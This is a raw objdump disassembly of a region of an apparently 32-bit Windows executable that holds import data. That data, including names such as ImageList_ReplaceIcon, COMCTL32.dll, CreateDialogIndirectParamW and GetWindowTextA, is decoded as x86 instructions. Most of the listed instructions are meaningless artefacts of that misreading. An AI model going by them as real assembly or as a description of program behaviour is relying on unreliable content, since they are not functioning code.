  42814f:	add    BYTE PTR [eax],al
  428151:	jb     0x428153
  428153:	jne    0x428155
  428155:	je     0x428157
  428157:	ins    DWORD PTR es:[edi],dx
  428158:	add    BYTE PTR [ebp+0x0],dh
  42815b:	arpl   WORD PTR [eax],ax
  42815d:	jne    0x42815f
  42815f:	jo     0x428161
  428161:	add    BYTE PTR [eax],al
  428163:	jae    0x428165
  428165:	outs   dx,DWORD PTR ds:[esi]
  428166:	add    BYTE PTR [esi+0x0],ah
  428169:	imul   eax,DWORD PTR [eax],0x630062
  42816f:	outs   dx,DWORD PTR ds:[esi]
  428170:	add    BYTE PTR [ecx+0x0],ch
  428173:	jb     0x428175
  428175:	jae    0x428177
  428177:	outs   dx,DWORD PTR ds:[esi]
  428178:	add    BYTE PTR [eax],al
  42817a:	add    BYTE PTR [ebx+0x0],dl
  42817d:	outs   dx,DWORD PTR ds:[esi]
  42817e:	add    BYTE PTR [ebx+0x0],ah
  428181:	popa   
  428182:	add    BYTE PTR [ecx+0x0],ch
  428185:	jae    0x428187
  428187:	data16 add BYTE PTR [ecx+0x0],ah
  42818b:	jb     0x42818d
  42818d:	popa   
  42818e:	add    BYTE PTR [ecx+0x0],ch
  428191:	add    BYTE PTR [eax],al
  428193:	add    BYTE PTR [esi],cl
  428195:	adc    BYTE PTR [eax],al
  428197:	out    0x67,eax
  428199:	adc    BYTE PTR [eax],al
  42819b:	js     0x4281c4
  42819d:	adc    BYTE PTR [eax],al
  42819f:	test   al,0x13
  4281a1:	adc    BYTE PTR [eax],al
  4281a3:	fs push esi
  4281a5:	adc    BYTE PTR [eax],al
  4281a7:	jp     0x4281c9
  4281a9:	adc    BYTE PTR [eax],al
  4281ab:	enter  0x1052,0x0
  4281af:	loop   0x428224
  4281b1:	adc    BYTE PTR [eax],al
  4281b3:	ja     0x428220
  4281b5:	adc    BYTE PTR [eax],al
  4281b7:	cmp    al,0x2b
  4281b9:	adc    BYTE PTR [eax],al
  4281bb:	rcl    BYTE PTR [edx],1
  4281bd:	adc    BYTE PTR [eax],al
  4281bf:	sbb    DWORD PTR [eax+0x10],ebx
  4281c2:	add    BYTE PTR [esi],ah
  4281c4:	add    dl,BYTE PTR [eax]
  4281c6:	add    BYTE PTR [edi+0xc],dh
  4281c9:	adc    BYTE PTR [eax],al
  4281cb:	mov    dh,BYTE PTR [ecx]
  4281cd:	adc    BYTE PTR [eax],al
  4281cf:	out    dx,al
  4281d0:	sbb    eax,0xed80010
  4281d5:	adc    BYTE PTR [eax],al
  4281d7:	add    eax,0x3300107f
  4281dc:	jbe    0x4281ee
  4281de:	add    BYTE PTR [ebx-0x68ffbd7f],dl
  4281e4:	add    DWORD PTR [edx+0x0],0x42819b
  4281eb:	lahf   
  4281ec:	add    DWORD PTR [edx+0x0],0x4281a3
  4281f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281f4:	add    DWORD PTR [edx+0x0],0x4281ab
  4281fb:	scas   eax,DWORD PTR es:[edi]
  4281fc:	add    DWORD PTR [edx+0x0],0x4281b3
  428203:	mov    bh,0x81
  428205:	inc    edx
  428206:	add    BYTE PTR [ebx-0x40ffbd7f],bh
  42820c:	add    DWORD PTR [edx+0x0],0x4281c3
  428213:	mov    DWORD PTR [ecx-0x7e34ffbe],0x81cf0042
  42821d:	inc    edx
  42821e:	add    bl,dl
  428220:	add    DWORD PTR [edx+0x0],0x4281d7
  428227:	fild   DWORD PTR [ecx-0x7d94ffbe]
  42822d:	inc    edx
  42822e:	add    BYTE PTR [edi-0x7e],ch
  428231:	inc    edx
  428232:	add    BYTE PTR [ebx-0x7e],dh
  428235:	inc    edx
  428236:	add    BYTE PTR [edi-0x7e],dh
  428239:	inc    edx
  42823a:	add    BYTE PTR [ebx-0x7e],bh
  42823d:	inc    edx
  42823e:	add    BYTE PTR [edi-0x7e],bh
  428241:	inc    edx
  428242:	add    BYTE PTR [ebx-0x78ffbd7e],al
  428248:	add    BYTE PTR [edx+0x0],0x8b
  42824c:	add    BYTE PTR [edx+0x0],0x8f
  428250:	add    BYTE PTR [edx+0x0],0x93
  428254:	add    BYTE PTR [edx+0x0],0x97
  428258:	add    BYTE PTR [edx+0x0],0x9b
  42825c:	add    BYTE PTR [edx+0x0],0x9f
  428260:	add    BYTE PTR [edx+0x0],0xa3
  428264:	add    BYTE PTR [edx+0x0],0xa7
  428268:	add    BYTE PTR [edx+0x0],0x29
  42826c:	or     al,0x10
  42826e:	add    BYTE PTR [edx-0x57ffefc2],dl
  428274:	push   edi
  428275:	adc    BYTE PTR [eax],al
  428277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428278:	outs   dx,DWORD PTR ds:[esi]
  428279:	adc    BYTE PTR [eax],al
  42827b:	push   ebx
  42827c:	popa   
  42827d:	adc    BYTE PTR [eax],al
  42827f:	add    dh,BYTE PTR [ebp+0x10]
  428282:	add    dh,cl
  428284:	jle    0x428296
  428286:	add    BYTE PTR [esi+edx*2],dl
  428289:	adc    BYTE PTR [eax],al
  42828b:	mov    al,0x68
  42828d:	adc    BYTE PTR [eax],al
  42828f:	aas    
  428290:	inc    esp
  428291:	adc    BYTE PTR [eax],al
  428293:	pop    ebp
  428294:	and    DWORD PTR [eax],edx
  428296:	add    bl,dl
  428298:	jl     0x4282aa
  42829a:	add    BYTE PTR [edx+0xb],dh
  42829d:	adc    BYTE PTR [eax],al
  42829f:	inc    edx
  4282a0:	push   eax
  4282a1:	adc    BYTE PTR [eax],al
  4282a3:	mov    ebp,0xbb001074
  4282a8:	pop    ds
  4282a9:	adc    BYTE PTR [eax],al
  4282ab:	sub    DWORD PTR [eax+0x10],eax
  4282ae:	add    BYTE PTR [ecx],dh
  4282b0:	ja     0x4282c2
  4282b2:	add    bl,dl
  4282b4:	sbb    dl,BYTE PTR [eax]
  4282b6:	add    BYTE PTR [esi+0x1e],ch
  4282b9:	adc    BYTE PTR [eax],al
  4282bb:	or     ch,BYTE PTR [esi]
  4282bd:	adc    BYTE PTR [eax],al
  4282bf:	sbb    eax,0xa100103e
  4282c4:	data16 adc BYTE PTR [eax],al
  4282c7:	xchg   ecx,eax
  4282c8:	bound  edx,QWORD PTR [eax]
  4282ca:	add    BYTE PTR [esi],bh
  4282cc:	dec    edi
  4282cd:	adc    BYTE PTR [eax],al
  4282cf:	in     eax,dx
  4282d0:	adc    BYTE PTR fs:[eax],al
  4282d3:	sub    bl,BYTE PTR [ecx+0x10]
  4282d6:	add    BYTE PTR [esi+0x43],al
  4282d9:	adc    BYTE PTR [eax],al
  4282db:	imul   edi,DWORD PTR [eax+edx*1],0x0
  4282df:	rol    BYTE PTR [esi+0x10],0x0
  4282e3:	in     eax,0x31
  4282e5:	adc    BYTE PTR [eax],al
  4282e7:	mov    esp,0xab00104f
  4282ec:	add    BYTE PTR [edx+0x0],0xaf
  4282f0:	add    BYTE PTR [edx+0x0],0xb3
  4282f4:	add    BYTE PTR [edx+0x0],0xb7
  4282f8:	add    BYTE PTR [edx+0x0],0xbb
  4282fc:	add    BYTE PTR [edx+0x0],0xbf
  428300:	add    BYTE PTR [edx+0x0],0xc3
  428304:	add    BYTE PTR [edx+0x0],0xc7
  428308:	add    BYTE PTR [edx+0x0],0xcb
  42830c:	add    BYTE PTR [edx+0x0],0xcf
  428310:	add    BYTE PTR [edx+0x0],0xd3
  428314:	add    BYTE PTR [edx+0x0],0xd7
  428318:	add    BYTE PTR [edx+0x0],0xdb
  42831c:	add    BYTE PTR [edx+0x0],0xdf
  428320:	add    BYTE PTR [edx+0x0],0xe3
  428324:	add    BYTE PTR [edx+0x0],0xe7
  428328:	add    BYTE PTR [edx+0x0],0xe1
  42832c:	and    dl,BYTE PTR [eax]
  42832e:	add    bh,bh
  428330:	push   ecx
  428331:	adc    BYTE PTR [eax],al
  428333:	test   BYTE PTR ds:0x1d0c0010,0x10
  42833a:	add    BYTE PTR [ebx],al
  42833c:	sbb    dl,BYTE PTR [eax]
  42833e:	add    ch,ah
  428340:	or     dl,BYTE PTR [eax]
  428342:	add    BYTE PTR [edi+0x42001035],bl
  428348:	pop    edi
  428349:	adc    BYTE PTR [eax],al
  42834b:	adc    eax,0xd300103f
  428350:	cmp    dl,BYTE PTR [eax]
  428352:	add    BYTE PTR [ebp+0x1001021],ah
  428358:	sbb    al,0x10
  42835a:	add    BYTE PTR [ebx-0x1effefd7],ch
  428360:	adc    BYTE PTR cs:[eax],al
  428363:	push   eax
  428364:	adc    BYTE PTR [bx+si],al
  428367:	mov    edi,0x2b00102d
  42836c:	add    DWORD PTR [edx+0x0],0x2f
  428370:	add    DWORD PTR [edx+0x0],0x33
  428374:	add    DWORD PTR [edx+0x0],0x37
  428378:	add    DWORD PTR [edx+0x0],0x3b
  42837c:	add    DWORD PTR [edx+0x0],0x3f
  428380:	add    DWORD PTR [edx+0x0],0x43
  428384:	add    DWORD PTR [edx+0x0],0x47
  428388:	add    DWORD PTR [edx+0x0],0x4b
  42838c:	add    DWORD PTR [edx+0x0],0x4f
  428390:	add    DWORD PTR [edx+0x0],0x53
  428394:	add    DWORD PTR [edx+0x0],0x57
  428398:	add    DWORD PTR [edx+0x0],0x5b
  42839c:	add    DWORD PTR [edx+0x0],0x5f
  4283a0:	add    DWORD PTR [edx+0x0],0x63
  4283a4:	add    DWORD PTR [edx+0x0],0x67
  4283a8:	add    DWORD PTR [edx+0x0],0xffffff98
  4283ac:	pusha  
  4283ad:	adc    BYTE PTR [eax],al
  4283af:	pop    ebp
  4283b0:	js     0x4283c2
  4283b2:	add    BYTE PTR [esi],bh
  4283b4:	dec    eax
  4283b5:	adc    BYTE PTR [eax],al
  4283b7:	cmp    al,0x7a
  4283b9:	adc    BYTE PTR [eax],al
  4283bb:	aam    0x9
  4283bd:	adc    BYTE PTR [eax],al
  4283bf:	or     cl,BYTE PTR [ebx]
  4283c1:	adc    BYTE PTR [eax],al
  4283c3:	pop    ebx
  4283c4:	push   ebp
  4283c5:	adc    BYTE PTR [eax],al
  4283c7:	mov    esi,0x6001032
  4283cc:	xor    edx,DWORD PTR [eax]
  4283ce:	add    BYTE PTR [esi-0x16ffefc0],al
  4283d4:	and    eax,0x61460010
  4283d9:	adc    BYTE PTR [eax],al
  4283db:	adc    DWORD PTR [ebp+0x10],ebp
  4283de:	add    al,al
  4283e0:	dec    esi
  4283e1:	adc    BYTE PTR [eax],al
  4283e3:	jae    0x428403
  4283e5:	adc    BYTE PTR [eax],al
  4283e7:	dec    ebx
  4283e8:	add    eax,0x83ab0010
  4283ed:	inc    edx
  4283ee:	add    BYTE PTR [edi-0x4cffbd7d],ch
  4283f4:	add    DWORD PTR [edx+0x0],0xffffffb7
  4283f8:	add    DWORD PTR [edx+0x0],0xffffffbb
  4283fc:	add    DWORD PTR [edx+0x0],0xffffffbf
  428400:	add    DWORD PTR [edx+0x0],0xffffffc3
  428404:	add    DWORD PTR [edx+0x0],0xffffffc7
  428408:	add    DWORD PTR [edx+0x0],0xffffffcb
  42840c:	add    DWORD PTR [edx+0x0],0xffffffcf
  428410:	add    DWORD PTR [edx+0x0],0xffffffd3
  428414:	add    DWORD PTR [edx+0x0],0xffffffd7
  428418:	add    DWORD PTR [edx+0x0],0xffffffdb
  42841c:	add    DWORD PTR [edx+0x0],0xffffffdf
  428420:	add    DWORD PTR [edx+0x0],0xffffffe3
  428424:	add    DWORD PTR [edx+0x0],0xffffffe7
  428428:	add    DWORD PTR [edx+0x0],0x0
	...
  428434:	cmp    dh,BYTE PTR [ecx+0x52]
  428437:	dec    edi
  428438:	add    BYTE PTR [eax],al
  42843a:	add    BYTE PTR [eax],al
  42843c:	nop
  42843d:	lea    eax,[edx]
  42843f:	add    BYTE PTR [ecx],al
  428441:	add    BYTE PTR [eax],al
  428443:	add    BYTE PTR [ecx],al
  428445:	add    BYTE PTR [eax],al
  428447:	add    BYTE PTR [ecx],al
  428449:	add    BYTE PTR [eax],al
  42844b:	add    BYTE PTR [eax-0x73],ah
  42844e:	add    al,BYTE PTR [eax]
  428450:	or     BYTE PTR [ebp-0x728ffffe],0x2
	...
  428463:	add    BYTE PTR [eax],ch
  428465:	xchg   BYTE PTR [edx],al
  428467:	add    BYTE PTR [esi+eax*4+0x2],al
  42846b:	add    BYTE PTR [esi-0x7a],dl
  42846e:	add    al,BYTE PTR [eax]
  428470:	push   0x80000286
  428475:	xchg   BYTE PTR [edx],al
  428477:	add    BYTE PTR [esi+eax*4-0x7951fffe],dl
  42847e:	add    al,BYTE PTR [eax]
  428480:	add    BYTE PTR [eax],al
  428482:	add    BYTE PTR [eax],al
  428484:	rol    BYTE PTR [esi-0x7911fffe],1
  42848a:	add    al,BYTE PTR [eax]
  42848c:	cld    
  42848d:	xchg   BYTE PTR [edx],al
  42848f:	add    BYTE PTR [edx],cl
  428491:	xchg   DWORD PTR [edx],eax
  428493:	add    BYTE PTR [esi],bl
  428495:	xchg   DWORD PTR [edx],eax
  428497:	add    BYTE PTR [edi+eax*4],ch
  42849a:	add    al,BYTE PTR [eax]
  42849c:	xchg   DWORD PTR ds:[edx],eax
  42849f:	add    BYTE PTR [eax-0x79],dl
  4284a2:	add    al,BYTE PTR [eax]
  4284a4:	pop    esi
  4284a5:	xchg   DWORD PTR [edx],eax
  4284a7:	add    BYTE PTR [eax-0x79],dh
  4284aa:	add    al,BYTE PTR [eax]
  4284ac:	add    BYTE PTR [edi-0x786ffffe],0x2
  4284b3:	add    BYTE PTR [esi-0x4ffffd79],bl
  4284b9:	xchg   DWORD PTR [edx],eax
  4284bb:	add    BYTE PTR [edi+eax*4-0x782dfffe],bh
  4284c2:	add    al,BYTE PTR [eax]
  4284c4:	in     al,0x87
  4284c6:	add    al,BYTE PTR [eax]
  4284c8:	test   BYTE PTR [edi-0x77fdfffe],0x2
  4284cf:	add    BYTE PTR [edx],dl
  4284d1:	mov    BYTE PTR [edx],al
  4284d3:	add    BYTE PTR [edx],ah
  4284d5:	mov    BYTE PTR [edx],al
  4284d7:	add    BYTE PTR [eax],bh
  4284d9:	mov    BYTE PTR [edx],al
  4284db:	add    BYTE PTR [eax+ecx*4+0x2],al
  4284df:	add    BYTE PTR [esi-0x78],dl
  4284e2:	add    al,BYTE PTR [eax]
  4284e4:	ins    BYTE PTR es:[edi],dx
  4284e5:	mov    BYTE PTR [edx],al
  4284e7:	add    BYTE PTR [esi-0x78],bh
  4284ea:	add    al,BYTE PTR [eax]
  4284ec:	mov    WORD PTR [eax-0x7763fffe],cs
  4284f2:	add    al,BYTE PTR [eax]
  4284f4:	scas   al,BYTE PTR es:[edi]
  4284f5:	mov    BYTE PTR [edx],al
  4284f7:	add    dl,al
  4284f9:	mov    BYTE PTR [edx],al
  4284fb:	add    al,bl
  4284fd:	mov    BYTE PTR [edx],al
  4284ff:	add    dl,ch
  428501:	mov    BYTE PTR [edx],al
  428503:	add    ah,bh
  428505:	mov    BYTE PTR [edx],al
  428507:	add    BYTE PTR [ecx+ecx*4],cl
  42850a:	add    al,BYTE PTR [eax]
  42850c:	sbb    al,0x89
  42850e:	add    al,BYTE PTR [eax]
  428510:	sub    al,0x89
  428512:	add    al,BYTE PTR [eax]
  428514:	mov    DWORD PTR ds:[edx],eax
  428517:	add    BYTE PTR [ecx+ecx*4+0x2],cl
  42851b:	add    BYTE PTR [edx-0x77],bl
  42851e:	add    al,BYTE PTR [eax]
  428520:	jb     0x4284ab
  428522:	add    al,BYTE PTR [eax]
  428524:	test   BYTE PTR [ecx-0x7669fffe],cl
  42852a:	add    al,BYTE PTR [eax]
  42852c:	mov    ds:0xae000289,al
  428531:	mov    DWORD PTR [edx],eax
  428533:	add    BYTE PTR [edx-0x35fffd77],bh
  428539:	mov    DWORD PTR [edx],eax
  42853b:	add    al,ah
  42853d:	mov    DWORD PTR [edx],eax
  42853f:	add    dh,ch
  428541:	mov    DWORD PTR [edx],eax
  428543:	add    BYTE PTR [eax],al
  428545:	mov    al,BYTE PTR [edx]
  428547:	add    BYTE PTR [edx],dl
  428549:	mov    al,BYTE PTR [edx]
  42854b:	add    BYTE PTR [eax],al
  42854d:	add    BYTE PTR [eax],al
  42854f:	add    BYTE PTR [edx+ecx*4],ch
  428552:	add    al,BYTE PTR [eax]
  428554:	add    BYTE PTR [eax],al
  428556:	add    BYTE PTR [eax],al
  428558:	dec    edx
  428559:	mov    al,BYTE PTR [edx]
  42855b:	add    BYTE PTR [edx+ecx*4+0x2],bl
  42855f:	add    BYTE PTR [esi-0x76],ch
  428562:	add    al,BYTE PTR [eax]
  428564:	test   BYTE PTR [edx-0x7569fffe],cl
  42856a:	add    al,BYTE PTR [eax]
  42856c:	test   al,0x8a
  42856e:	add    al,BYTE PTR [eax]
  428570:	mov    eax,0xd600028a
  428575:	mov    al,BYTE PTR [edx]
  428577:	add    dh,ah
  428579:	mov    al,BYTE PTR [edx]
  42857b:	add    ah,dh
  42857d:	mov    al,BYTE PTR [edx]
  42857f:	add    BYTE PTR [ebx+ecx*4],al
  428582:	add    al,BYTE PTR [eax]
  428584:	adc    cl,BYTE PTR [ebx-0x74ddfffe]
  42858a:	add    al,BYTE PTR [eax]
  42858c:	mov    eax,DWORD PTR cs:[edx]
  42858f:	add    BYTE PTR [eax-0x75],al
  428592:	add    al,BYTE PTR [eax]
  428594:	push   edx
  428595:	mov    eax,DWORD PTR [edx]
  428597:	add    BYTE PTR [eax-0x75],ch
  42859a:	add    al,BYTE PTR [eax]
  42859c:	jbe    0x428529
  42859e:	add    al,BYTE PTR [eax]
  4285a0:	or     BYTE PTR [ebx-0x7463fffe],0x2
  4285a7:	add    BYTE PTR [ebx+ecx*4-0x7433fffe],dh
  4285ae:	add    al,BYTE PTR [eax]
  4285b0:	fimul  DWORD PTR [ebx-0x7419fffe]
  4285b6:	add    al,BYTE PTR [eax]
  4285b8:	clc    
  4285b9:	mov    eax,DWORD PTR [edx]
  4285bb:	add    BYTE PTR [eax],al
  4285bd:	add    BYTE PTR [eax],al
  4285bf:	add    BYTE PTR [eax],bl
  4285c1:	mov    WORD PTR [edx],es
  4285c3:	add    BYTE PTR [edx],ah
  4285c5:	mov    WORD PTR [edx],es
  4285c7:	add    BYTE PTR [eax],dh
  4285c9:	mov    WORD PTR [edx],es
  4285cb:	add    BYTE PTR [esp+ecx*4],bh
  4285ce:	add    al,BYTE PTR [eax]
  4285d0:	dec    esp
  4285d1:	mov    WORD PTR [edx],es
  4285d3:	add    BYTE PTR [edx-0x74],bl
  4285d6:	add    al,BYTE PTR [eax]
  4285d8:	data16 mov WORD PTR [edx],es
  4285db:	add    BYTE PTR [eax-0x74],dh
  4285de:	add    al,BYTE PTR [eax]
  4285e0:	or     BYTE PTR [edx+eax*1+0x28c9800],0x0
  4285e8:	scas   al,BYTE PTR es:[edi]
  4285e9:	mov    WORD PTR [edx],es
  4285eb:	add    ah,al
  4285ed:	mov    WORD PTR [edx],es
  4285ef:	add    ah,dl
  4285f1:	mov    WORD PTR [edx],es
  4285f3:	add    ah,ah
  4285f5:	mov    WORD PTR [edx],es
  4285f7:	add    ah,dh
  4285f9:	mov    WORD PTR [edx],es
  4285fb:	add    BYTE PTR [edx],al
  4285fd:	lea    eax,[edx]
  4285ff:	add    BYTE PTR [edx],bl
  428601:	lea    eax,[edx]
  428603:	add    BYTE PTR [ecx*4-0x72cffffe],ah
  42860a:	add    al,BYTE PTR [eax]
  42860c:	lea    eax,ds:[edx]
	...
  42861f:	add    BYTE PTR [ebx+0x6d],ah
  428622:	fs cs gs js 0x42868c
  428627:	add    BYTE PTR [edi],dl
  428629:	add    BYTE PTR [ebp+eiz*2+0x73],al
  42862d:	je     0x4286a1
  42862f:	outs   dx,DWORD PTR ds:[esi]
  428630:	jns    0x428682
  428632:	jb     0x4286a3
  428634:	jo     0x42869b
  428636:	jb     0x4286ac
  428638:	jns    0x42868d
  42863a:	push   0x50746565
  42863f:	popa   
  428640:	add    BYTE PTR gs:[bx+si],al
  428644:	pop    esp
  428645:	add    BYTE PTR [eax+0x72],dl
  428648:	outs   dx,DWORD PTR ds:[esi]
  428649:	jo     0x4286b0
  42864b:	jb     0x4286c1
  42864d:	jns    0x4286a2
  42864f:	push   0x57746565
  428654:	add    BYTE PTR [eax],al
  428656:	pop    ebx
  428657:	add    BYTE PTR [eax+0x72],dl
  42865a:	outs   dx,DWORD PTR ds:[esi]
  42865b:	jo     0x4286c2
  42865d:	jb     0x4286d3
  42865f:	jns    0x4286b4
  428661:	push   0x41746565
  428666:	add    BYTE PTR [eax],al
  428668:	dec    esi
  428669:	add    BYTE PTR [ecx+0x6d],cl
  42866c:	popa   
  42866d:	addr16 gs dec esp
  428670:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  428677:	ins    BYTE PTR es:[edi],dx
  428678:	popa   
  428679:	arpl   WORD PTR [ebp+0x49],sp
  42867c:	arpl   WORD PTR [edi+0x6e],bp
  42867f:	add    BYTE PTR [ecx],dh
  428681:	add    BYTE PTR [ecx+0x6d],cl
  428684:	popa   
  428685:	addr16 gs dec esp
  428688:	imul   esi,DWORD PTR [ebx+0x74],0x7365445f
  42868f:	je     0x428703
  428691:	outs   dx,DWORD PTR ds:[esi]
  428692:	jns    0x428694
  428694:	inc    eax
  428695:	add    BYTE PTR [ecx+0x6d],cl
  428698:	popa   
  428699:	addr16 gs dec esp
  42869c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  4286a3:	dec    ecx
  4286a4:	ins    DWORD PTR es:[edi],dx
  4286a5:	popa   
  4286a6:	addr16 gs inc ebx
  4286a9:	outs   dx,DWORD PTR ds:[esi]
  4286aa:	jne    0x42871a
  4286ac:	je     0x4286ae
  4286ae:	dec    esp
  4286af:	add    BYTE PTR [ecx+0x6d],cl
  4286b2:	popa   
  4286b3:	addr16 gs dec esp
  4286b6:	imul   esi,DWORD PTR [ebx+0x74],0x6d65525f
  4286bd:	outs   dx,DWORD PTR ds:[esi]
  4286be:	jbe    0x428725
  4286c0:	add    BYTE PTR [eax],al
  4286c2:	inc    ebx
  4286c3:	dec    edi
  4286c4:	dec    ebp
  4286c5:	inc    ebx
  4286c6:	push   esp
  4286c7:	dec    esp
  4286c8:	xor    esi,DWORD PTR [edx]
  4286ca:	cs fs ins BYTE PTR es:[edi],dx
  4286cd:	ins    BYTE PTR es:[edi],dx
  4286ce:	add    BYTE PTR [eax],al
  4286d0:	push   edi
  4286d1:	add    BYTE PTR [ebx+0x72],al
  4286d4:	gs popa 
  4286d6:	je     0x42873d
  4286d8:	inc    esp
  4286d9:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4286e0:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4286e8:	jb     0x42874b
  4286ea:	ins    DWORD PTR es:[edi],dx
  4286eb:	push   edi
  4286ec:	add    BYTE PTR [eax],al
  4286ee:	xor    al,BYTE PTR [edx]
  4286f0:	push   ebx
  4286f1:	gs je  0x428737
  4286f4:	popa   
  4286f5:	jb     0x42875c
  4286f7:	je     0x428749
  4286f9:	outs   dx,DWORD PTR ds:[esi]
  4286fa:	jae    0x4286fc
  4286fc:	cmp    al,BYTE PTR [ecx]
  4286fe:	inc    edi
  4286ff:	gs je  0x42874f
  428702:	gs jae 0x428778
  428705:	popa   
  428706:	addr16 gs inc ecx
  428709:	add    BYTE PTR [edx+0x61724400],dh
  42870f:	ja     0x428757
  428711:	jb     0x428774
  428713:	ins    DWORD PTR es:[edi],dx
  428714:	gs inc ebx
  428716:	outs   dx,DWORD PTR ds:[esi]
  428717:	outs   dx,BYTE PTR ds:[esi]
  428718:	je     0x42878c
  42871a:	outs   dx,DWORD PTR ds:[esi]
  42871b:	ins    BYTE PTR es:[edi],dx
  42871c:	add    BYTE PTR [eax],al
  42871e:	sbb    BYTE PTR [ecx],al
  428720:	inc    edi
  428721:	gs je  0x42876d
  428724:	arpl   WORD PTR [edi+0x6e],bp
  428727:	dec    ecx
  428728:	outs   dx,BYTE PTR ds:[esi]
  428729:	outs   dx,WORD PTR ds:[esi]
  42872b:	add    bl,bh
  42872d:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428731:	arpl   WORD PTR [ebx+0x50],bp
  428734:	outs   dx,DWORD PTR ds:[esi]
  428735:	jo     0x4287ac
  428737:	jo     0x428786
  428739:	outs   dx,BYTE PTR gs:[esi]
  42873b:	jne    0x42873d
  42873d:	add    cl,bl
  42873f:	add    DWORD PTR [ebp+0x6f],ecx
  428742:	outs   dx,BYTE PTR ds:[esi]
  428743:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  42874b:	push   edx
  42874c:	arpl   WORD PTR gs:[eax+eax*1+0x39],si
  428751:	add    BYTE PTR [ebx+0x68],al
  428754:	popa   
  428755:	jb     0x4287ac
  428757:	jo     0x4287c9
  428759:	gs jb  0x4287b3
  42875c:	add    BYTE PTR [eax],al
  42875e:	add    dl,BYTE PTR ds:[ebx+0x65]
  428762:	je     0x4287a8
  428764:	ins    BYTE PTR es:[edi],dx
  428765:	addr16 dec ecx
  428767:	je     0x4287ce
  428769:	ins    DWORD PTR es:[edi],dx
  42876a:	push   esp
  42876b:	gs js  0x4287e2
  42876e:	inc    ecx
  42876f:	add    BYTE PTR [edx+eax*1+0x53],bh
  428773:	push   0x774f776f
  428778:	outs   dx,BYTE PTR ds:[esi]
  428779:	gs fs push eax
  42877c:	outs   dx,DWORD PTR ds:[esi]
  42877d:	jo     0x4287f4
  42877f:	jo     0x4287f4
  428781:	add    BYTE PTR [eax],bl
  428783:	add    dl,BYTE PTR [edx+0x65]
  428786:	ins    DWORD PTR es:[edi],dx
  428787:	outs   dx,DWORD PTR ds:[esi]
  428788:	jbe    0x4287ef
  42878a:	push   eax
  42878b:	jb     0x4287fc
  42878d:	jo     0x4287e6
  42878f:	add    BYTE PTR [edi+0x2],bh
  428792:	push   ebx
  428793:	push   0x6957776f
  428798:	outs   dx,BYTE PTR ds:[esi]
  428799:	outs   dx,DWORD PTR fs:[esi]
  42879b:	ja     0x42879d
  42879d:	add    BYTE PTR [ebx],bl
  42879f:	add    BYTE PTR [ebx+0x61],al
  4287a2:	ins    BYTE PTR es:[edi],dx
  4287a3:	ins    BYTE PTR es:[edi],dx
  4287a4:	push   edi
  4287a5:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  4287ac:	outs   dx,DWORD PTR ds:[esi]
  4287ad:	arpl   WORD PTR [edi+0x0],dx
  4287b0:	mov    dh,0x1
  4287b2:	dec    esp
  4287b3:	outs   dx,DWORD PTR ds:[esi]
  4287b4:	popa   
  4287b5:	fs dec ebp
  4287b7:	outs   dx,BYTE PTR gs:[esi]
  4287b9:	jne    0x4287fc
  4287bb:	add    BYTE PTR [edx+eax*1+0x74697753],al
  4287c2:	arpl   WORD PTR [eax+0x54],bp
  4287c5:	outs   dx,DWORD PTR ds:[esi]
  4287c6:	push   esp
  4287c7:	push   0x69577369
  4287cc:	outs   dx,BYTE PTR ds:[esi]
  4287cd:	outs   dx,DWORD PTR fs:[esi]
  4287cf:	ja     0x4287d1
  4287d1:	add    BYTE PTR [eax],ah
  4287d3:	add    dl,BYTE PTR [ebx+0x63]
  4287d6:	jb     0x428847
  4287d8:	ins    BYTE PTR es:[edi],dx
  4287d9:	ins    BYTE PTR es:[edi],dx
  4287da:	push   edi
  4287db:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4287e2:	add    BYTE PTR [eax],al
  4287e4:	pop    DWORD PTR [eax]
  4287e6:	inc    esp
  4287e7:	gs push di
  4287ea:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  4287f1:	outs   dx,DWORD PTR ds:[esi]
  4287f2:	arpl   WORD PTR [edi+0x0],dx
  4287f5:	add    BYTE PTR [ecx],dh
  4287f7:	add    BYTE PTR [ebx+0x68],al
  4287fa:	popa   
  4287fb:	jb     0x42884d
  4287fd:	jb     0x428864
  4287ff:	jbe    0x428858
  428801:	add    BYTE PTR [edx+eax*1+0x696c6156],ch
  428808:	fs popa 
  42880a:	je     0x428871
  42880c:	push   edx
  42880d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428812:	xor    eax,DWORD PTR [ecx]
  428814:	inc    edi
  428815:	gs je  0x428865
  428818:	outs   dx,BYTE PTR gs:[esi]
  42881a:	jne    0x428865
  42881c:	je     0x428883
  42881e:	ins    DWORD PTR es:[edi],dx
  42881f:	dec    ecx
  428820:	inc    esp
  428821:	add    BYTE PTR ds:0x6e655302,ch
  428827:	fs dec esi
  428829:	outs   dx,DWORD PTR ds:[esi]
  42882a:	je     0x428895
  42882c:	data16 jns 0x42887c
  42882f:	gs jae 0x4288a5
  428832:	popa   
  428833:	addr16 gs push edi
  428836:	add    BYTE PTR [eax],al
  428838:	mov    al,0x1
  42883a:	dec    esp
  42883b:	outs   dx,DWORD PTR ds:[esi]
  42883c:	popa   
  42883d:	fs dec ecx
  42883f:	arpl   WORD PTR [edi+0x6e],bp
  428842:	push   edi
  428843:	add    BYTE PTR [ecx+0x57734901],ah
  428849:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  428850:	popa   
  428851:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  428855:	add    BYTE PTR ds:0x74654701,dl
  42885b:	inc    esi
  42885c:	outs   dx,DWORD PTR ds:[esi]
  42885d:	jb     0x4288c4
  42885f:	addr16 jb 0x4288d1
  428862:	jne    0x4288d2
  428864:	fs push edi
  428866:	imul   ebp,DWORD PTR [esi+0x64],0x7500776f
  42886d:	add    DWORD PTR [edi+0x65],eax
  428870:	je     0x4288c9
  428872:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428879:	js     0x4288ef
  42887b:	inc    ecx
  42887c:	add    BYTE PTR [eax],al
  42887e:	add    DWORD PTR ds:[edi+0x65],eax
